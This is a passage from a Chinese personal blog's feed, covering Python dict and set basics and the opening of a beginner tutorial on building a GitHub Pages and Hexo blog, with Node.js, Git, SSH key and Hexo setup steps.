(1,)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; numOne</span></span><br><span class="line">(1,)</span><br></pre></td></tr></table></figure><p>然后，<strong>Python</strong> 在显示只有 1 个元素的 <strong>tuple</strong> 时，也会加一个逗号<font color="red"><code>,</code></font> ，以免误解成数学计算意义上的括号。</p><p></p><h1>字典</h1><p></p><h2>0x00 dict</h2><p>　　<strong>Python</strong> 内置了字典，<strong>dict</strong> 全称 <strong>dictionary</strong> 。其他语言中，可能称作为 <strong>map</strong> ，具有极快的查找速度，使用 <strong>key-value</strong>(键-值)存储：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary = &#123;<span class="hljs-string">'zone'</span>:0,<span class="hljs-string">'one'</span>:1,<span class="hljs-string">'two'</span>:2&#125;</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary</span></span><br><span class="line">&#123;'zone': 0, 'one': 1, 'two': 2&#125;</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'one'</span>]</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><strong>dict</strong> 查找速度非常快，其实现原理就像查字典一样；</p><p>而 <strong>list</strong> 查找元素的方法就是从头到尾，一个一个地找，<strong>list</strong> 越大，查找越慢。</p><p><strong>dict</strong> 就是先在字典的索引表中找到所要查找的元素所对应的页码，然后直接翻到该页面找到。</p><p>这种 <strong>key-value</strong> 储存方式，存放时必须根据 <strong>key</strong> 算出 <strong>value</strong> 的存放位置；取的时候才能根据 <strong>key</strong> 直接拿到 <strong>value</strong> 。重要牢记：<font color="red"><strong>key必须是不可变对象</strong></font> 。</p><p><strong>通过key放入</strong>：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'four'</span>] = 4</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'four'</span>]</span></span><br><span class="line">4</span><br></pre></td></tr></table></figure><p><strong>后到优先</strong>：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'var'</span>] = 5</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'var'</span>]</span></span><br><span class="line">5</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'var'</span>] = 6</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'var'</span>]</span></span><br><span class="line">6</span><br></pre></td></tr></table></figure><p>一个 <strong>key</strong> 只能对应一个 <strong>value</strong> ，<strong>So，后到优先</strong> 。</p><p><strong>key</strong> 不存在，<strong>dict</strong> 就会报错：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary[<span class="hljs-string">'ten'</span>]</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">KeyError: 'ten'</span><br></pre></td></tr></table></figure><p>判断 <strong>key</strong> 是否存在：</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; <span class="hljs-string">'ten'</span> <span class="hljs-keyword">in</span> dictionary</span></span><br><span class="line">False</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary.get(<span class="hljs-string">'ten'</span>)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary.get(<span class="hljs-string">'zone'</span>)</span></span><br><span class="line">0</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary.get(<span class="hljs-string">'ten'</span>,10)</span></span><br><span class="line">10</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary</span></span><br><span class="line">&#123;'zone': 0, 'one': 1, 'two': 2&#125;</span><br></pre></td></tr></table></figure><p>两种方法，一是通过 <strong>in</strong> 判断；二是 <strong>dict</strong> 提供的 <strong>get</strong> 方法， <strong>key</strong> 不存在，会返回 <strong>None</strong> （交互式不显示None）；通过 <strong>get</strong> 方法还可以指定一个 <strong>value</strong> ，但是不会加入此字典，如上所示。</p><p><strong>删除：</strong></p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary.pop(<span class="hljs-string">'one'</span>)</span></span><br><span class="line">1</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; dictionary</span></span><br><span class="line">&#123;'zone': 0,'two': 2&#125;</span><br></pre></td></tr></table></figure><p>使用 <strong>pop(key)</strong> 方法删除 <strong>key</strong> ，所对应的 <strong>value</strong> 也会从 <strong>dict</strong> 中删除； <strong>dict</strong> 内部存放顺序和 <strong>key</strong> 放入顺序无关。</p><p> <strong>特点：</strong></p><ul><li><strong>dict</strong><ul><li>查找、插入速度极快，不受<strong>key</strong>的增加而受影响</li><li>需占用大量内存</li></ul></li><li><strong>list</strong><ul><li>查找和插入的时间会随元素的增加而增加</li><li>占用内存较小</li></ul></li></ul><h2>0x01 set</h2><p>　　<strong>set</strong> 和 <strong>dict</strong> 非常类似，也是一组 <strong>key</strong> 的集合，但其不存储 <strong>value</strong> 。</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; setEx = <span class="hljs-built_in">set</span>([<span class="hljs-string">'zone'</span>,<span class="hljs-string">'one'</span>,<span class="hljs-string">'two'</span>])</span><br><span class="line">&gt;&gt;&gt; setEx</span><br><span class="line">&#123;<span class="hljs-string">'zone'</span>,<span class="hljs-string">'one'</span>,<span class="hljs-string">'two'</span>&#125;</span><br></pre></td></tr></table></figure><p>　　创建一个 <strong>set</strong> 需要提供一个 <strong>list</strong> 作为输入集合；传入参数 <strong>[zone,one,two]</strong> 是一个 <strong>list</strong> ，而显示的 <strong>{zone,one,two}</strong> 只是说明 <strong>setEx</strong> 内部有这三个元素。注意显示的顺序不代表 <strong>set</strong> 是<strong>有序</strong>的； <strong>set</strong> 中的 <strong>key</strong> 不能重复。</p><p><strong>添加/删除：</strong></p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx.add(<span class="hljs-string">'three'</span>)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx</span></span><br><span class="line">&#123;'zone','one','two','three'&#125;</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx.remove(<span class="hljs-string">'zone'</span>)</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx</span></span><br><span class="line">&#123;'one','two','three'&#125;</span><br></pre></td></tr></table></figure><p><strong>add(key)</strong> 方法添加元素（可重复添加，但然并卵），<strong>remove(key)</strong> 方法删除元素。</p><p>另外，<strong>set</strong> 可做数学意义上的交集、并集等：</p> <figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx1 = <span class="hljs-built_in">set</span>([<span class="hljs-string">'one'</span>,<span class="hljs-string">'two'</span>,<span class="hljs-string">'three'</span>])</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx2 = <span class="hljs-built_in">set</span>([<span class="hljs-string">'two'</span>,<span class="hljs-string">'three'</span>,<span class="hljs-string">'four'</span>])</span></span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx1 &amp; setEx2</span></span><br><span class="line">&#123;'two','three'&#125;</span><br><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx1 | setEx2</span></span><br><span class="line">&#123;'one','two','three','four'&#125;</span><br></pre></td></tr></table></figure><p>　　<strong>set</strong> 和 <strong>dict</strong> 唯一区别在于 <strong>value</strong> ，<strong>set</strong> 同样不可放入可变对象，<strong>list</strong> 放入 <strong>set</strong> 会报错。</p><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&gt;</span><span class="hljs-bash">&gt;&gt; setEx3 = <span class="hljs-built_in">set</span>([1,3,[4,5]])</span></span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File "&lt;stdin&gt;", line 1, in &lt;module&gt;</span><br><span class="line">TypeError: unhashable type: 'list'</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;/p&gt;&lt;h1&gt;列表&lt;/h1&gt;&lt;p&gt;&lt;/p&gt;
&lt;h2&gt;0x00 list&lt;/h2&gt;

&lt;p&gt;　　  列表 &lt;font color=&quot;red&quot;&gt;&lt;code&gt;list&lt;/code&gt;&lt;/font&gt; 是 Python 内置的一种数据类型，它是一种&lt;b&gt;有序&lt;/b&gt;的集合，可随时&lt;b&gt;添加&lt;/b&gt;(append)和&lt;b&gt;删除&lt;/b&gt;(pop)其中的元素。&lt;br&gt;&lt;figure class=&quot;highlight shell hljs&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-bash&quot;&gt;&amp;gt;&amp;gt; VarName = [&lt;span class=&quot;hljs-string&quot;&gt;&#39;elements0&#39;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&#39;elements1&#39;&lt;/span&gt;,&lt;span class=&quot;hljs-string&quot;&gt;&#39;elements2&#39;&lt;/span&gt;]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;hljs-meta&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;hljs-bash&quot;&gt;&amp;gt;&amp;gt; VarName&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[&#39;elements0&#39;,&#39;elements1&#39;,&#39;elements2&#39;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Notes" scheme="https://fanqxu.com/categories/Notes/"/>
    
    
      <category term="python" scheme="https://fanqxu.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>零基础博客搭建之Github Pages+Hexo</title>
    <link href="https://fanqxu.com/2018/10/24/%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8BGithub-Pages-Hexo/index.html"/>
    <id>https://fanqxu.com/2018/10/24/零基础博客搭建之Github-Pages-Hexo/index.html</id>
    <published>2018-10-23T16:00:00.000Z</published>
    <updated>2019-01-08T07:32:59.141Z</updated>
    
    <content type="html"><![CDATA[<p>　　本文是一篇零基础的博客独立搭建教程，将会从<b><font color="red">最开始的注册Github账号</font></b>以及<strong>Git</strong>……到最后的<b><font color="red">工具推荐</font></b>。写这篇文章，主要是因为本人博客也刚刚搭建完成；我想把我搭建博客的过程在一篇文章中详详细细的记录下来，放在将来……</p><a id="more"></a><blockquote><p>MyBlog: <b><font color="green">FanqXu | FanqXu’Blog</font></b> <a href="https://fanqxu.com">https://fanqxu.com</a>，简洁主义。(Update by 2018.12.27)</p><p><img src="http://ww1.sinaimg.cn/large/006V665tgy1fyz6z9nrxaj310u0or41w.jpg" alt=""></p></blockquote><hr><h2 id="0x00-前言-可跳过废话"><a href="#0x00-前言-可跳过废话" class="headerlink" title="0x00 前言(可跳过废话)"></a>0x00 前言(可跳过废话)</h2><p>『搭建博客容易，持续写博文困难』，这句话说的真的没错。</p><p>作为一个没有网页基础的挨踢狗小白，对于博客的搭建，其实和非IT者一样迷茫。好在善于使用搜索引擎，不管是<a href="https://www.baidu.com" target="_blank" rel="noopener">百度</a>，还是<a href="https://www.google.com" target="_blank" rel="noopener">Google</a>,自己动手去查来解决问题就很棒！其次，需要耐心和喜欢折腾；最后，必不可少的学习钻研能力。</p><p>其实本人非常建议各位搭建一个独立博客的；无论理工科还是文科，理工科同学可以用它来作<b><font color="yello">技术分享</font></b>（本人挨踢狗、程序猿一枚），文科亦可拿它来<b><font color="yello">写作输出</font></b>，我想 <b><font color="red">This is very goog！！！</font></b></p><p>介于本人所使用的操作系统非视窗(Windows)，而是Ubuntu18.04(Linux)；所以会有些步骤和各位所使用的视窗操作系统有所不同。不过不用担心，考虑到视窗的普遍性，我将会重新使用Windows10来重新完成一次博客的搭建。</p><p>其实博客搭建有多种方式，这里我将会推荐各位选择较简单的一种方式</p><ul><li><p>Github Pages &amp; Hexo/Jekell</p><ul><li><a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a><ol><li>作为程序猿，Github是必须知道了解和学习的；</li><li>Github象征着开源，而开源大势所趋；</li><li>顺便了解Git、Github团队协作流程；</li></ol></li><li><a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a><ol><li>快速、简洁且高效的博客框架</li><li>支持Markdown语法，便于博文的编写</li><li>插件多</li></ol></li></ul></li><li><p>Wordpress</p><ul><li><a href="https://wordpress.org" target="_blank" rel="noopener">https://wordpress.org</a><ul><li><del>其实我不太懂</del></li></ul></li></ul></li></ul><p>我们选择第一种方式，Github Pages + Hexo(放弃了Jekell)，这样对于我们小白来说，也会相对轻松一点；而Wordpress <del>我其实不太懂</del> 就相对复杂，貌似需要自行购买服务器……废话不多说，我们立马正式开始。</p><h2 id="0x01-正式开始"><a href="#0x01-正式开始" class="headerlink" title="0x01 正式开始"></a>0x01 正式开始</h2><h3 id="一、基本软件"><a href="#一、基本软件" class="headerlink" title="一、基本软件"></a>一、基本软件</h3><h4 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a><a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a></h4><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhhwxwjvlj30sw0jjq4r.jpg" alt=""><br>点击直接下载：<br><a href="https://nodejs.org/dist/v8.12.0/node-v8.12.0-x64.msi" target="_blank" rel="noopener">https://nodejs.org/dist/v8.12.0/node-v8.12.0-x64.msi</a></p><p>下载完可在本地文件夹看到；双击打开后，一路<code>next</code>即可安装，<br>等会儿，就安装完毕了！</p><h4 id="Git"><a href="#Git" class="headerlink" title="Git"></a><a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a></h4><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhhy1kqqij30sv0ji0zk.jpg" alt=""><br>点击直接下载：<br><a href="https://github.com/git-for-windows/git/releases/download/v2.19.1.windows.1/Git-2.19.1-64-bit.exe" target="_blank" rel="noopener">https://github.com/git-for-windows/git/releases/download/v2.19.1.windows.1/Git-2.19.1-64-bit.exe</a></p></blockquote><p>这个和上面一样，一路<code>next</code>就OJBK!</p><p>一路<code>next</code>，其他不用管。安装完成后按住你的Win键（视窗键/Super键），找到<code>Git Bash</code>并打开。</p><blockquote><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhij4nb6cj30ks0hwwla.jpg" alt=""><br>然后就是这个样子:<br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi28zg88nj30t30l23yc.jpg" alt=""><br>到这里基本软件就已完成了……</p></blockquote></blockquote><h3 id="二、Github账号注册及仓库创建"><a href="#二、Github账号注册及仓库创建" class="headerlink" title="二、Github账号注册及仓库创建"></a>二、Github账号注册及仓库创建</h3><h4 id="1-账号注册"><a href="#1-账号注册" class="headerlink" title="1. 账号注册"></a>1. 账号注册</h4><p>这个更简单，虽界面全英文(<b><font color="green">有英语基础更好</font></b>)，不过不用担心，都是一些简单的基础的单词。</p><blockquote><p>废话不多说，直接上图:</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhzul4sjej30t70ivwgu.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhzw4h3fvj30t70ivjsu.jpg" alt=""><br>将页面拖下来<br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhzxlm5lxj30kk0dp3yl.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhzy0we9gj30x50oxmyl.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhzypvs06j30sp0m0gmm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwhzz775qkj30vg0knjt2.jpg" alt=""><br>至此，你的Github账号就创建完成了……</p></blockquote></blockquote><h4 id="2-仓库创建"><a href="#2-仓库创建" class="headerlink" title="2. 仓库创建"></a>2. 仓库创建</h4><p>也很简单，照着图依次就位吧</p><blockquote><p>点击右上角<strong>Your repositories</strong></p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi9yz3ahmj310n0mewiw.jpg" alt=""><br>然后再点击右边绿色按钮<strong>New</strong><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi9yyurdvj31110mfwfr.jpg" alt=""><br>之后，先在<strong>Repository name</strong>中输入<code>username.github.io</code><br><strong>Description</strong>中填上“MyBlog”（可选项），其他都默认；</p></blockquote><p>注意：<code>username</code>是你的<strong>Github用户名</strong></p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi9yyxa3rj310p0mdq53.jpg" alt=""><br>最后点击<strong>Create repository</strong>按钮，创建完成。</p></blockquote></blockquote><h3 id="三、Git及SSH配置Github"><a href="#三、Git及SSH配置Github" class="headerlink" title="三、Git及SSH配置Github"></a>三、Git及SSH配置Github</h3><h4 id="1-备份并移除原SSHkey"><a href="#1-备份并移除原SSHkey" class="headerlink" title="1. 备份并移除原SSHkey"></a>1. 备份并移除原<code>SSHkey</code></h4><p>首先,打开<code>Git Bash</code><br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> ~/.ssh</span><br></pre></td></tr></table></figure></p><p>如若出现如下，那么恭喜你，这一步不用操作了，直接跳到第二部<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">"No such file or directory"</span></span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2cyo2lwj30t00l2glq.jpg" alt="">　　</p><h4 id="2-生成新的SSHkey"><a href="#2-生成新的SSHkey" class="headerlink" title="2. 生成新的SSHkey"></a>2. 生成新的<code>SSHkey</code></h4><p>将引号中的Email换成你的(之前注册Github的邮箱)，另外此处的「-C」的是大写的「C」<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="hljs-string">"fanqxu@gmail.com"</span></span><br></pre></td></tr></table></figure></p><p>这里的话会有个提示：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Enter passphrase (empty <span class="hljs-keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br></pre></td></tr></table></figure></p><p>提示你输入密码，这里的输入的密码是将来你提交项目时使用，如果为空的话提交项目时则不用输入；我没有输入密码，而是直接回车的；这个设置是防止别人往你的项目里提交内容。</p><p>注意：输入密码的时候没有 * 字样的，你直接输入就可以了。<br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2d6cfe3j30t50l374p.jpg" alt=""><br>到这里，看到上图那样的界面，<code>SSHkey</code>的设置就OJBK了……</p><h4 id="3-配置到Github"><a href="#3-配置到Github" class="headerlink" title="3. 配置到Github"></a>3. 配置到Github</h4><p>首先，先编辑~/.ssh目录下的id_rsa.pub<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="hljs-built_in">cd</span> ~/.ssh</span><br><span class="line">$ vi id_rsa.pub</span><br></pre></td></tr></table></figure></p><blockquote><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2dgasitj30t10l33yt.jpg" alt="viid_rsa.pub"><br>将这一大串字符复制一下，然后再按下<code>:q!</code>退出……　　<br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2dlqc0tj30t50l0t93.jpg" alt="copy"><br>打开浏览器中的Github，看图依次点击<br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2dt3hh4j30ye0jbjrz.jpg" alt="GithubHome"><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2dyfvb7j30ya0jcaac.jpg" alt="SSHkeys"><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2e3zee0j30ya0j93yz.jpg" alt="PasteAdd"><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2e7mghij30yd0jdmyl.jpg" alt="Finished"></p></blockquote></blockquote><p>最后在回到<code>Git Bash</code>，先测试，然后做Git的最后个人信息配置<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@GitHub.com</span><br></pre></td></tr></table></figure></p><p>这条命令输完后，可能会出现<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host <span class="hljs-string">'github.com (207.97.227.239)'</span> can<span class="hljs-string">'t be established.</span></span><br><span class="line"><span class="hljs-string">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class="line"><span class="hljs-string">Are you sure you want to continue connecting (yes/no)?</span></span><br></pre></td></tr></table></figure></p><p>No紧张，输入<code>yes</code>就OK，然后你就会看到如下：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi gentlyss! You<span class="hljs-string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure></p><p>最后，配置你的个人账号信息<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="hljs-string">"gentlyss"</span></span><br><span class="line">$ git config --global email.name <span class="hljs-string">"fanqxu@gmail.com"</span></span><br></pre></td></tr></table></figure></p><p>注意：<code>&quot;&quot;</code>中的应为你的用户名及Email<br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwi2ejmu1xj30t60l374n.jpg" alt="testConfig"><br>到这儿，SSH配置完成……</p><h3 id="四、Hexo配置及完成博客搭建"><a href="#四、Hexo配置及完成博客搭建" class="headerlink" title="四、Hexo配置及完成博客搭建"></a>四、Hexo配置及完成博客搭建</h3><h4 id="1-Hexo安装、初始化、依赖包"><a href="#1-Hexo安装、初始化、依赖包" class="headerlink" title="1. Hexo安装、初始化、依赖包"></a>1. Hexo安装、初始化、依赖包</h4><blockquote><p>在计算机上找个位置新建一个名为<code>username.github.io</code>的文件夹<br>此命名为了方便后期管理……</p><blockquote><p><img src="http://ww1.sinaimg.cn/large/006V665tly1fwibsd5evzj30uq0k8glt.jpg" alt=""><br>双击进入此文件夹，右键点击<strong>Git Bash here</strong><br><img src="http://ww1.sinaimg.cn/large/006V665tly1fwibsd71ucj30ur0k6dg6.jpg" alt=""></p></blockquote></blockquote><p>1）然后先安装hexo<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p><p>2）其次，初始化<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure></p><p>3）最后，安装依赖包<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install</span><br></pre></td></tr></table></figure></p><h4 id="2-常用命令、本地服务测试"><a href="#2-常用命令、本地服务测试" class="headerlink" title="2. 常用命令、本地服务测试"></a>2. 常用命令、本地服务测试</h4><p>hexo常见的五条命令<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="hljs-string">"postName"</span> //新建文章</span><br><span class="line">$ hexo clean          //清除缓存</span><br><span class="line">$ hexo generate       //生成静态文件，位置在public目录</span><br><span class="line">$ hexo server         //本地服务，用于预览、测试</span><br><span class="line">$ hexo deploy         //部署到Github，目前还未配置远程部署，还不可以使用</span><br></pre></td></tr></table></figure></p><p>比如我想新建一篇名为<code>使用GithubPages+Hexo零基础搭建博客</code>博文，就可以这样子：<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="hljs-string">"使用GithubPages+Hexo零基础搭建博客"</span></span><br></pre></td></tr></table></figure></p><p>完成后，你就可以在source/_posts文件夹中找到<strong>使用Github…….md</strong>文件，你可以使用你熟悉的编辑器撰写，本人的这篇文章就是使用<strong>Atom</strong>完成的。</p><p>当然，每次对博客做了修改，可按照上述几条命令，就能完成相应部署。</p><p>执行完<b><font color="red">hexo server</font></b>这条命令时，你就可以打开<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a>看到刚刚搭建的本地博客</p><p>更多命令用法，可参照<a href="https://hexo.io/zh-cn/docs/commands.html" target="_blank" rel="noopener">Hexo官网</a>，<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">Hexo官方文档</a>是非常推荐阅读的。</p><h4 id="3-部署至Github"><a href="#3-部署至Github" class="headerlink" title="3. 部署至Github"></a>3. 部署至Github</h4><p>首先，给各位推荐几个Markdown语法编辑器，有些文件切记不要使用记事本打开；</p><ul><li><p><a href="https://www.sublimetext.com/" target="_blank" rel="noopener">Sublime Text</a></p></li><li><p><a href="https://atom.io/" target="_blank" rel="noopener">Atom</a></p></li><li><p><a href="https://www.typora.io/" target="_blank" rel="noopener">Typora</a></p></li></ul><p>然后使用上面的Sublime或者原子，打开博客文件夹中的_config.yml文件，划到最下面，<br><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># Deployment   用于部署到github</span></span><br><span class="line"><span class="hljs-comment">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="hljs-built_in">type</span>: git        <span class="hljs-comment"># git提交</span></span><br><span class="line">  repository: git@github.com:fanqxu/fanqxu.github.io.git  <span class="hljs-comment"># 这里的fanqxu应是你的Github用户名</span></span><br><span class="line">  branch: master   <span class="hljs-comment"># 就写master</span></span><br></pre></td></tr></table></figure></p><p>很简单，按照上面的说明修改，<br>然后安装Hexo的Git deploy插件：<br><figure 